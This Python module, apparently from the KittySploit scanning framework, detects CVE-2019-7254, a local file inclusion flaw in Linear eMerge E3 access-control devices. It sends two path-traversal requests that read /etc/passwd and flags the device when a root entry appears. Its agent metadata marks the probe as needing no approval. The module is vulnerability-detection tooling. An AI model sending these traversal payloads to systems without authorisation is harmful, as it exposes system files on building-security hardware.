#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Linear eMerge E3-Series devices are vulnerable to local file inclusion."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'eMerge E3 1.00-06 - Local File Inclusion Detection',
        'description': 'Linear eMerge E3-Series devices are vulnerable to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'emerge', 'lfi', 'edb', 'packetstorm', 'nortekcontrol', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/47616',
            'https://applied-risk.com/labs/advisories',
            'https://www.applied-risk.com/resources/ar-2019-005',
            'http://packetstormsecurity.com/files/155252/Linear-eMerge-E3-1.00-06-Directory-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-7254',
        ],
        'cve': 'CVE-2019-7254',
    }

    def run(self):
        for path in ('/?c=../../../../../../etc/passwd%00', '/badging/badge_print_v0.php?tpl=../../../../../etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="eMerge E3 1.00-06 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

